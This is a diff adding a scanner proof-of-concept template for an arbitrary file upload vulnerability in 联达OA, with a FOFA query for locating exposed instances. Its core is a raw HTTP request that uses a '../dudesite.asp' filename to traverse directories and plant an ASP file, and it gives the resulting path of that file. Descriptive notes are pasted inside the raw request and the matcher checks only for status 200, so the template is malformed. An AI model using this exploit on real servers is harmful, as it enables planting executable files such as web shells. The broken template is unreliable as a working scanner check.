@@ -1,0 +1,73 @@
+id: poc-saih67xv7s2yub2v
+info:
+  name: 联达OA-UpLoadFile.aspx 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/saih67xv7s2yub2v'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: saih67xv7s2yub2v
+    fofa: app="联达OA"
+http:
+- raw:
+  - 'POST /FileManage/UpLoadFile.aspx HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+
+    Connection: close
+
+
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="DesignId"
+
+
+
+
+    1
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="file"; filename="../dudesite.asp"
+
+
+    Content-Type: image/png
+
+
+
+
+    dudesite
+
+
+    --00content0boundary00--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /FileManage/dudesite.asp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
